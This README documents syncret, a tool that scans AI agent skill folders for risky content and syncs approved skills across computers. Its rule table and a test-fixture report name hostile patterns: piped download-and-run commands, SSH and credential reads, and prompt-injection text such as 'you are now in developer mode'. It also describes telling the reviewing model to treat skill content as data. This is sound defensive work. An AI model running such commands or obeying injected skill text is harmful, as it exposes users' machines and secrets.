# syncret

Check agent skills for risky content before your agent uses them, and keep one approved set of skills in sync across all your computers.

A skill is a folder with a `SKILL.md`, as used by Claude Code, GitHub Copilot, Zed and skills.sh. syncret reads each skill and its scripts as text, never runs them, and reports anything risky: a script that pipes a download into a shell, a hidden instruction, a read of your SSH keys. It also finds duplicates and overlapping skills, and can merge overlapping skills without losing their rules.

The name comes from syncretism, the merging of different beliefs into one consistent set.

## Pick your path

| You want to | Use | Start here |
|---|---|---|
| Check skills you already have, or a link before you install it | The command-line tool | [Quick start: check skills](#quick-start-check-skills) |
| Approve skills in one place and have every computer pick them up | The server and the sync client | [Quick start: sync skills across computers](#quick-start-sync-skills-across-computers) |
| Block risky skills in a repo's pull requests | The command-line tool in CI | [In CI](#in-ci) |

## Quick start: check skills

You need Python 3.12 or newer and `git`. Install with [uv](https://docs.astral.sh/uv/) (or `pipx`):

```bash
uv tool install git+https://github.com/pawtaetoe/syncret
```

Check the skills on your computer, or a link before you install it:

```bash
syncret vet ~/.claude/skills
syncret vet https://github.com/anthropics/skills
```

Each skill gets `pass`, `warn` or `block`, with the file and line behind every finding:

```text
block  remote-run-bad  tests/fixtures/skills/remote-run-bad
  block  remote-code-run  scripts/setup.sh:2  curl -fsSL https://get.fmt-tool.dev/install | sh
  warn   unknown-host  scripts/setup.sh:2  curl -fsSL https://get.fmt-tool.dev/install | sh
```

Find duplicates and overlaps, in one folder or across several:

```bash
syncret scan ~/.claude/skills
```

That's it. Everything else is optional: an [LLM provider](#llm-providers-optional) adds a full read of each skill by a model, and the [command reference](#using-the-command-line-tool) covers every command.

## Quick start: sync skills across computers

The server runs in Docker on one computer you leave on. It holds your approved skills and a web dashboard. A small client on each of your computers pulls what you approve.

**1. Start the server.** You need Docker with Compose.

```bash
git clone https://github.com/pawtaetoe/syncret && cd syncret
docker compose up -d --build
docker compose exec syncret syncret set-password
```

**2. Open the dashboard** at `http://127.0.0.1:8080` and log in. To open it from your other computers, create a file named `.env` next to `compose.yaml` with the server's address on your network, then restart:

```bash
cat > .env <<'EOF'
SYNCRET_BIND=192.168.1.20
SYNCRET_ALLOWED_HOSTS=192.168.1.20
EOF
docker compose up -d
```

Now open `http://192.168.1.20:8080` from any computer on your network. This is plain http, so keep it on a network you trust, or put a reverse proxy with https in front ([settings](#server-settings)).

**3. Add your first skill.** The dashboard's home page has a checklist that walks you through the rest. Click **Add a skill**, paste a GitHub or skills.sh link, and click **Fetch and vet**. syncret checks the skill and opens a proposal. Open it, read the report, and click **Approve and publish**.

**4. Connect each computer.** On the **Machines** page, type the computer's name and click **Create token**. The page shows the token and the exact install commands for Linux, macOS and Windows, with your server's address filled in. On that computer, run them and paste the token when asked. On Linux, also run `sudo loginctl enable-linger $USER` so syncing carries on while you are logged out.

The installer syncs once straight away, so the computer's last sync shows on the Machines page and your approved skills are linked into Claude Code, Copilot and Zed. After that it picks up new approvals within an hour (set on Settings).

Already have skills in `~/.agents/skills` on that computer? The client won't replace that folder. See [moving existing skills into syncret](#moving-existing-skills-into-syncret) first.

**5. Optional: add a model.** Rules alone already block risky skills. A model also reads each skill in full, labels overlaps and builds merges. To use your Claude plan, run `claude setup-token` on any computer with a browser, paste the token on the **Settings** page, and add a provider in the box under **LLM providers**:

```toml
[providers.claude]
type = "claude-code"
can_see_own = true
```

Click **Run LLM check** to test it.

---

## Using the command-line tool

### Vet

```bash
syncret vet ~/.claude/skills
syncret vet ~/.claude/skills --json
syncret vet https://github.com/anthropics/skills
syncret vet https://github.com/anthropics/skills/tree/main/skills/pdf
syncret vet https://skills.sh/anthropics/skills/frontend-design
```

`vet` takes a skill, a folder of skills (searched recursively), a GitHub link to a repo, folder or `SKILL.md`, or a skills.sh link. Links are fetched with a shallow `git` fetch into a temporary folder that is removed afterwards. Each report links the skill on GitHub at the commit that was checked.

The verdicts mean:

- **pass**: no rule matched. That is not a promise the skill is safe, so still read what you install.
- **warn**: something worth reading before you use it.
- **block**: something risky. syncret exits 1, and the server won't publish it.

#### Rules

| Rule | Severity | Flags |
|---|---|---|
| `remote-code-run` | block | downloads piped into a shell or interpreter: `curl ... \| sh`, `bash <(curl ...)`, `irm ... \| iex` |
| `hidden-unicode` | block | zero-width, bidi override and tag characters, and control characters in the frontmatter `name` or `description` |
| `credential-read` | block | `~/.ssh` and SSH keys, cloud credentials, keychains, browser profile data |
| `instruction-tampering` | block | telling the agent to skip confirmations, hide actions, keep things from the user or ignore its instructions |
| `prompt-injection` | block | text telling AI reviewers or scanners the skill is safe, fake system or chat-turn markers, "you are now in developer mode" |
| `unpinned-install` | warn | `npx` or `pip install` without an exact version |
| `encoded-blob` | warn | base64 or hex runs of 200 characters or more |
| `env-file` | warn | `.env` files |
| `unknown-host` | warn | a host called from a script that `SKILL.md` never names |
| `without-asking` | warn | acting "without asking", "without confirmation" or "without permission" |
| `hidden-comment` | warn | markdown comments that speak to the agent, which are hidden when rendered |
| `broad-description` | warn | a description so short or generic it would trigger on almost anything |
| `hooks-in-frontmatter` | warn | `hooks` in the frontmatter, which run commands on agent events |
| `outside-link` | warn | a symlink inside the skill that points outside it; its target is never read |

A skill that fails to load (missing or broken frontmatter) gets a `load-error` warning.

Skills often describe the very things these rules look for, for example a review checklist that lists `curl ... | sh` as a red flag. So `remote-code-run`, `credential-read`, `instruction-tampering` and `prompt-injection` drop from block to warn when the line is a mention rather than an instruction: quoted, said with "never" or "not", a list item under a lead-in like "Red flags:" or "Avoid:", or a comment in a script. A mention still shows in the report.

With an [LLM provider](#llm-providers-optional), `vet` also has the model read the whole skill and adds `llm-review` findings for what patterns can't see. A review can only add findings, so a skill a rule blocks stays blocked whatever the model says.

### Scan

```bash
syncret scan ~/.claude/skills --no-llm
syncret scan ~/.claude/skills ~/projects/app/.claude/skills --json
```

`scan` vets every skill it finds across one or more folders, then reports:

- **exact duplicates**: skills with the same content, including copies and symlinked copies
- **name collisions**: skills with the same `name` but different content
- **overlap candidates**: pairs whose descriptions share most of their words, labelled unconfirmed

```text
vet: 6 skills: 6 pass

exact duplicates: 1
  d83f517f3265  tests/fixtures/scan-a/billing-csv
                tests/fixtures/scan-b/billing-csv
                tests/fixtures/scan-b/billing-csv-link

name collisions: 1
  photo-rename  tests/fixtures/scan-a/photo-rename
                tests/fixtures/scan-b/photo-rename

overlap candidates, unconfirmed: 2
  0.60  tests/fixtures/scan-a/billing-csv
        tests/fixtures/scan-b/csv-summary
  0.56  tests/fixtures/scan-a/photo-rename
        tests/fixtures/scan-b/photo-rename
```

`scan` only reports. It never edits, moves or deletes anything.

With an [LLM provider](#llm-providers-optional), `scan` labels each overlap candidate, and each pair of skills sharing a name, as duplicate, overlapping, conflicting or independent, with a one-line summary and the lines that disagree:

```text
overlaps: 2
  independent 0.47  .../built-in-browser
                    .../chrome-browser
      Skill A covers the desktop app's built-in browser pane and Skill B covers the Chrome
      extension; each one explicitly excludes the other's tools, so they never apply to the
      same situation.
```

Both outputs come from the test fixtures in this repo, so you can reproduce them from a clone with `uv run syncret vet tests/fixtures/skills/remote-run-bad` and `uv run syncret scan tests/fixtures/scan-a tests/fixtures/scan-b --no-llm`.

### Diff rules

```bash
syncret diff-rules old-skill/ new-skill/
```

Lists every rule kept, changed, dropped or added between two versions of a skill (folders or `SKILL.md` files). A rule is any sentence that says always, never, must, only, don't or do not. Code blocks and frontmatter are skipped. A changed rule whose meaning flips, such as "Never push to main" becoming "Always push to main", is marked:

```text
kept: 1
changed: 2
  0.80  old:9  - Never push directly to main.  meaning flipped
        new:9  - Always push directly to main.
  0.92  old:10  - Only deploy from a tagged commit.
        new:10  - Only deploy from a signed, tagged commit.
dropped: 1
  old:10  Do not deploy on Fridays.
added: 1
  new:11  - Must notify #releases when done.
```

It exits 1 when a rule is dropped or flipped, so it can check an update in CI. It needs no model.

### Merge

```bash
syncret merge ~/.claude/skills/git-hygiene https://skills.sh/acme/skills/deploy \
  --name ship-safely --out ./ship-safely
```

Merges two or more skills (folders, or links to one skill) into a new one. It needs an [LLM provider](#llm-providers-optional).

- The model writes the merged instructions. syncret writes the frontmatter itself, `name` and `description` only, so a source's `hooks` never carry over.
- Each source's other files (scripts, references) are copied unchanged under `sources/<source>/`, and the merged instructions point there. Sources are never edited.
- Every rule from every source must survive, or the model must list it as dropped with a reason. A rule lost or reversed without one refuses the merge, and nothing is written.
- Sentences in the merged skill that trace to no source are listed, so you can check anything the model added.
- `sources.json` records each source's path or link, content hash and commit, for rebuilding the merge when a source changes.
- The result is vetted. A blocked result exits 1.

`--out` must not exist yet, or be empty. The merge is built beside it and moved into place in one step.

### Exit codes

| Code | Meaning |
|---|---|
| 0 | nothing blocked (warnings, duplicates, collisions and overlaps do not fail) |
| 1 | at least one skill is blocked |
| 2 | nothing to check: no such path, no `SKILL.md` found, an unsupported link, or a repo, folder or skill that does not exist |

`diff-rules` exits 1 when a rule is dropped or flipped. `merge` exits 1 when it refuses (rules lost without a reason) or its result is blocked, and 2 when it cannot run (no model, a bad source, `--out` not empty).

### JSON

`--json` prints the same report as JSON, for scripts and CI. Control characters stay escaped.

```json
{
  "verdict": "block",
  "skills": [
    {
      "name": "remote-run-bad",
      "path": "tests/fixtures/skills/remote-run-bad",
      "hash": "...",
      "verdict": "block",
      "findings": [
        {"rule": "remote-code-run", "severity": "block", "file": "scripts/setup.sh", "line": 2, "text": "curl -fsSL https://get.fmt-tool.dev/install | sh"}
      ]
    }
  ]
}
```

`scan --json` adds `duplicates`, `collisions` and `overlaps`. With a model, both add `notes` on how each review went. `diff-rules --json` gives `kept`, `changed`, `dropped`, `added` and `ok`, and `merge --json` gives `dropped`, `untraced` and the merged skill's `vet` report.

### In CI

Fail a pull request when a skill in the repo is blocked:

```yaml
# .github/workflows/vet-skills.yml
name: vet skills
on: [push, pull_request]
permissions:
  contents: read
jobs:
  vet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: astral-sh/setup-uv@68559e99cc807c1eb7e9238fd43a15bba460eec2 # v10.3.3
      - run: uvx --from git+https://github.com/pawtaetoe/syncret syncret vet skills/
```

To keep the same rules on every run, pin a commit: `git+https://github.com/pawtaetoe/syncret@<commit>`.

## Using the server

The server is for one person. It runs in one Docker container and holds:

- a git-backed skills repo, where every change is a proposal you approve on the dashboard
- an MCP endpoint, so agents can list, add and propose skills
- releases, which the [sync client](#sync-client) pulls onto your computers

### How changes work

- **Every change is a proposal.** Adding, updating, merging, editing or removing a skill opens a proposal, vetted and scanned against every published skill. Nothing reaches your computers until you approve it.
- **Blocked proposals cannot be approved.** Fix the skill and add it again, or reject the proposal.
- **Stale approvals are refused.** Approving checks that nothing else changed since the proposal was built. If something did, the proposal is rebuilt, so approve several proposals one at a time.
- **Upstream skills are tracked.** Every few hours (6 by default, set on Settings) the server checks each skill added from GitHub at the branch or tag it came from. When one changed, it opens an update proposal. Settings also has **Check upstream now**.
- **Overlaps suggest merges.** With a model configured, adding a skill that overlaps a published one also opens a merge proposal. Pick one, or reject both.
- **Merges follow their sources.** Approving an update to a skill that a merged skill was built from opens a proposal rebuilding that merge.
- **One writer.** A single background worker makes every change, one job at a time. The dashboard and MCP only queue jobs, which show on the Activity page.

### Dashboard pages

| Page | What it is for |
|---|---|
| Proposals | Changes waiting for you, with their vetting results, and a getting-started checklist until the first computer has synced |
| Proposal | The vetting report, scan findings and diff of one change, with Approve and Reject |
| Add | Add a skill from a GitHub or skills.sh link, or a folder on the server, and choose where it goes |
| Skills | Every published skill with its kind, source, version and where it is sent; edit your own skills, remove any |
| Scan | Check every published skill again for risky content, duplicates, name clashes and overlaps |
| Activity | Background jobs with their results and logs, for when something fails |
| Machines | A token per computer, the install commands for it, and each computer's last sync |
| Claude account | Skills meant for the Claude apps, a zip of each to upload, and which are out of date |
| Settings | How often things run, the Claude token, the MCP token and the model providers |

### Server settings

`compose.yaml` reads these from the shell or from an `.env` file next to it:

| Variable | Default | Use |
|---|---|---|
| `SYNCRET_BIND` | `127.0.0.1` | The address the dashboard listens on. Set your server's network address to reach it from other computers |
| `SYNCRET_PORT` | `8080` | The port |
| `SYNCRET_ALLOWED_HOSTS` | | The hostname or address people type to reach the server, comma-separated. MCP refuses any other |
| `SYNCRET_HTTPS` | `0` | Set `1` when a reverse proxy serves https, so the login cookie is marked Secure |

Server commands, run from the folder with `compose.yaml`:

```bash
docker compose exec syncret syncret set-password        # set or change the dashboard password
docker compose exec syncret syncret set-claude-token    # save a `claude setup-token` token instead of using Settings
docker compose exec syncret syncret llm check           # test the model providers
docker compose logs -f syncret                          # watch the server's log
```

The Claude token comes from `claude setup-token`, run once on any computer with a browser. It lasts a year and only makes model requests, so the container needs no Claude login. Settings shows its age and warns before it ends.

### Updating and backing up

To update the server, pull and rebuild. Your skills and settings stay in the `syncret-data` volume:

```bash
git pull && docker compose up -d --build
```

To back up, copy the volume:

```bash
docker run --rm -v syncret_syncret-data:/data -v "$PWD":/backup alpine tar -czf /backup/syncret-data.tgz -C /data .
```

The volume holds the skills repo, the job database, settings, releases, and a `secrets/` folder (password hash, login key, Claude token, MCP token hash) readable only by the container's user. The container runs as a non-root user on a read-only filesystem with all capabilities dropped.

### MCP

Make a token on the Settings page, then add the endpoint to an agent, for example Claude Code:

```bash
claude mcp add --transport http syncret https://syncret.example.com/mcp \
  --header "Authorization: Bearer syncret_mcp_..."
```

Tools: `list_skills`, `list_proposals`, `show_proposal`, `approve(id, base)`, `reject`, `add_skill`, `remove_skill`, `propose_edit`, `propose_merge`, `scan` and `job_status`. Writes queue jobs and return a job id. `approve` only goes through while `base` is still current, and its description tells agents to use it only when you say so. `show_proposal` marks skill content as untrusted.

### Releases

Each approval publishes a release: a tarball holding only the skills meant for your computers, one folder each, and a `manifest.json` (plus `links.tsv` for shell clients) saying which agents link each one. A skill also sent to the Claude account is not linked for Claude Code, which already loads it from the account. Computers fetch `/release/latest` (or `?format=text`) and `/release/<id>.tar.gz` with their token from the Machines page.

## Sync client

The client runs on each computer, syncs once at install, then checks every 15 minutes and fetches a new release once the interval set on Settings has passed (60 minutes by default). It links each approved skill into Claude Code (`~/.claude/skills`), Copilot (`~/.copilot/skills`) and Zed (`~/.agents/skills`). The Machines page shows these commands with your server's address after you create a token.

| System | Install | Needs |
|---|---|---|
| Linux | `bash client/install.sh --url http://your-server:8080` | bash, curl, tar, a systemd user timer |
| macOS (not yet tested) | `bash client/install.sh --url http://your-server:8080` | the same, with a launchd agent |
| Windows (not yet tested) | `powershell -ExecutionPolicy Bypass -File client\install.ps1 -Url http://your-server:8080` | PowerShell and the built-in `tar.exe`; no admin rights |

Run these from a clone of this repo (`git clone https://github.com/pawtaetoe/syncret && cd syncret`). Each asks for the computer's token. On Linux, run `sudo loginctl enable-linger $USER` too, so the timer runs while you are logged out.

Everyday commands:

```bash
syncret-sync --force               # sync now (Windows: sync.ps1 -Force)
bash client/install.sh --uninstall # remove the timer and script, keep the skills you have (Windows: install.ps1 -Uninstall)
```

The server address and token live in `~/.config/syncret/client.env` (Windows: `%APPDATA%\syncret\client.env`), readable only by you.

<details>
<summary>What the client does on each run</summary>

1. Takes a lock, so only one sync runs at a time, and skips the run until the interval set on the server has passed.
2. Asks `/release/latest` for the newest release and its SHA-256. The token is never passed on a command line.
3. Downloads a new release, checks its SHA-256, unpacks it into `~/.local/share/syncret/releases/<id>/` (Windows: `%LOCALAPPDATA%\syncret\releases`) and makes it read-only.
4. Points `~/.agents/skills` at the release in one atomic rename, so an agent sees the old release or the new one, never a mix. On Windows the junction swap takes two steps, so an agent starting at that instant may briefly find no folder.
5. Links each skill into `~/.claude/skills` and `~/.copilot/skills` as the release says, through `~/.agents/skills`, so the next swap moves them too.
6. Keeps the last 3 releases.

It only ever changes or removes links it made. Your own skill folders, links to elsewhere, and anything already at a skill's name are left alone.

</details>

### Moving existing skills into syncret

If a computer already has skills in `~/.agents/skills` (for example from `npx skills add`), the client won't replace that folder. Move the skills into syncret first:

1. Add each skill on the dashboard's Add page, by its GitHub or skills.sh link if it has one, so syncret tracks updates. Otherwise add it as a folder on the server. For a server in a container, copy the folder in first, then add `/tmp/import/skills/<name>`:

   ```bash
   tar -C ~/.agents -cf - skills | docker compose exec -T syncret sh -c 'mkdir -p /tmp/import && tar -x -C /tmp/import'
   ```

2. Approve the proposals one at a time.
3. A blocked skill can't be published. To keep using it on this computer, copy it as a real folder into `~/.claude/skills` (or `~/.copilot/skills`). The client never touches real folders.
4. Move the old folder aside, remove the links that pointed into it, then install the client:

   ```bash
   mv ~/.agents/skills ~/.agents/skills.before-syncret
   find ~/.claude/skills ~/.copilot/skills -maxdepth 1 -type l -lname "$HOME/.agents/skills/*" -delete 2>/dev/null
   bash ~/path/to/syncret/client/install.sh --url http://your-server:8080
   ```

Once the synced skills show up, delete `~/.agents/skills.before-syncret`.

## LLM providers (optional)

Every rule works without a model. A model adds what patterns can't do: reading a skill in full, labelling overlaps, and building merged skills.

On the server, providers are set on the Settings page. For the command-line tool, they live in `~/.config/syncret/config.toml` (or pass `--config`). Providers are tried in order until one answers:

```toml
[providers.claude]
type = "claude-code"     # runs `claude -p` on your Claude plan, with no tools
can_see_own = true       # may receive your own skills (default false)

[providers.opus]
type = "anthropic"       # needs `uv tool install "syncret[anthropic] @ git+https://github.com/pawtaetoe/syncret"`
model = "claude-opus-5-5"
api_key_env = "ANTHROPIC_API_KEY"   # optional; otherwise the SDK's usual lookup, such as `ant auth login`
can_see_own = true
fallbacks = true         # server-side refusal fallbacks

[providers.gemini]
type = "gemini"          # Google's OpenAI-compatible endpoint, key in GEMINI_API_KEY
model = "gemini-3.8-flash"

[providers.local]
type = "openai-compatible"           # OpenRouter, a local Ollama, Meta's Model API, ...
base_url = "http://localhost:11434/v1"
model = "llama3.3"
json_mode = "prompt"     # "schema" (default), "object", or "prompt" for servers without JSON schema support
can_see_own = true

[jobs]                   # optional: providers per job, in order
review = ["gemini", "claude"]
overlap = ["gemini", "claude"]
merge = ["opus", "claude"]
```

- **Your own skills stay private by default.** Local skills count as your own. They are only sent to a provider whose `can_see_own` is `true`. If none is allowed, that step is skipped, never sent anyway.
- **No secrets in the file.** API providers name the environment variable that holds their key.
- **Rate limits and failures** are retried, then the next provider is tried.
- **Plain http only to your own computer.** `base_url` must use `https`, except for `localhost`.
- `vet`, `scan` and `merge` take `--config <file>`, and `--public` to treat local skills as public. `vet` and `scan` take `--no-llm` to skip the model.

Check the setup with one tiny request per provider. It sends no skill content:

```bash
syncret llm check
```

```text
ok    claude  claude-code, default model, may see own skills
```

### What is sent, and what is trusted

- A skill goes to the model between boundary lines carrying a random token, as data the model is told never to obey. Text that tries to instruct the reviewer is itself reported.
- Every line the model quotes must be found in the skill, or the finding is dropped and counted.
- Schema files (`.xsd`, `.dtd`, `.rng`, `.rnc`) are named but not sent; the rules still check them. A skill over 400,000 characters is skipped with a note, never cut short.
- The Claude Code provider runs with no tools and no MCP servers, so a skill under review cannot make it act.

### Claude Code provider

The `claude-code` provider needs the Claude Code CLI on your `PATH`. On the server it is already in the container, and uses the token saved on Settings. On your own computer, install it with the [native installer](https://code.claude.com/docs/en/setup), then log in once by running `claude`:

```bash
curl -fsSL https://claude.ai/install.sh | bash
claude --version
```

syncret runs it as `claude -p --output-format json --json-schema <schema> --tools "" --strict-mcp-config --no-session-persistence`, with the skill on stdin. If `claude` is not on your `PATH`, set `command = "/full/path/to/claude"` on the provider.

<details>
<summary>Sharing the CLI with Zed or VS Code</summary>

Zed's agent panel and the VS Code extension each run their own bundled copy of Claude Code. You can point both at the CLI you installed, so your editor and syncret run one binary, updated in one place. Login, settings and skills in `~/.claude` are shared either way, and usage counts against the same Claude plan.

In both editors, use the full path to `claude`. With remote development (Zed remote projects, VS Code Remote-SSH), give the path on the remote computer, where the agent runs. The change applies to agents started after it; restart the editor, or reconnect to the remote.

**Zed.** Add this to Zed's `settings.json`. `type` is required: `"registry"` is for agents installed from Zed's agent registry, which take `env` but no `command`.

```json
{
  "agent_servers": {
    "claude-acp": {
      "type": "registry",
      "env": { "CLAUDE_CODE_EXECUTABLE": "/home/<you>/.local/bin/claude" }
    }
  }
}
```

**VS Code.** The Claude Code extension's `claudeCode.claudeProcessWrapper` setting names the program that launches Claude, and the extension passes its bundled binary's path to it as an argument. Point the setting at a small wrapper that skips that path and runs your CLI:

```bash
mkdir -p ~/.local/bin
cat > ~/.local/bin/claude-vscode <<'EOF'
#!/bin/sh
# VS Code passes its bundled claude first; skip it and run the installed CLI
case "$1" in
  */claude|*/claude.exe) shift ;;
esac
exec "$HOME/.local/bin/claude" "$@"
EOF
chmod +x ~/.local/bin/claude-vscode
```

Then in VS Code's `settings.json` (on the remote, for Remote-SSH):

```json
{
  "claudeCode.claudeProcessWrapper": "/home/<you>/.local/bin/claude-vscode"
}
```

Per the extension's docs, a wrapper also skips the "conversation still open elsewhere" check, turns off plan-mode restore on resume, and lists `claude -p` sessions alongside the extension's own. This follows the extension's documentation and has not been tested by syncret itself. On Windows, use a `.cmd` wrapper with the same logic.

</details>

## Troubleshooting

| Problem | Fix |
|---|---|
| Other computers can't open the dashboard | The server listens on `127.0.0.1` until you set `SYNCRET_BIND` in `.env` ([step 2](#quick-start-sync-skills-across-computers)). If it still fails, a firewall may block the port: on Ubuntu, `sudo ufw allow from 192.168.1.0/24 to any port 8080` |
| The login page says no password is set | Run `docker compose exec syncret syncret set-password` |
| `install.sh: No such file or directory` | Run it from the cloned repo, or by its full path, such as `bash ~/syncret/client/install.sh` |
| The client says `~/.agents/skills` is a real folder | It never replaces your own folder. See [moving existing skills into syncret](#moving-existing-skills-into-syncret) |
| A computer's last sync stays at "never" | Run `syncret-sync --force` on it and read the message. On Linux, check `systemctl --user list-timers syncret-sync.timer` and that linger is on |
| A skill you approved is missing from `~/.claude/skills` | The client leaves anything already at that name alone. Remove your own copy, then run `syncret-sync --force` |
| `claude: command not found` after installing it | The installer puts it in `~/.local/bin`. Log in again, or run `export PATH="$HOME/.local/bin:$PATH"` |
| A proposal says it is stale | Another change was approved first. It rebuilds by itself; approve the new one |
| A skill is blocked by a false positive | Open an issue with the finding. A block can't be overridden on the server, by design |

## Safety

syncret reads skills as text and never executes, imports or sources them. It never follows a symlink out of a skill, so a skill cannot make it read `~/.ssh` or other files on your computer; such links are reported as `outside-link`. A skill folder that is itself a symlink, as in `~/.claude/skills`, works as usual. When a skill comes from a link:

- symlinks in the repo are checked out as plain files, so a link to `~/.ssh` cannot make syncret read your keys
- git hooks, credential prompts and LFS downloads are off, and paths that leave the checkout are refused
- link names and refs cannot start with `-`, so a link cannot pass options to `git`

Skill text printed to the terminal or the dashboard shows control and invisible characters as `<U+XXXX>`, so a skill cannot forge report lines or send terminal escape codes.

## Development

```bash
git clone https://github.com/pawtaetoe/syncret && cd syncret
uv sync --all-extras
uv run pytest
uv run ruff check
uv run ty check src/
SYNCRET_CONTAINER_TEST=1 uv run pytest tests/container   # builds and runs the image
```

## License

MIT, see [LICENSE](LICENSE).
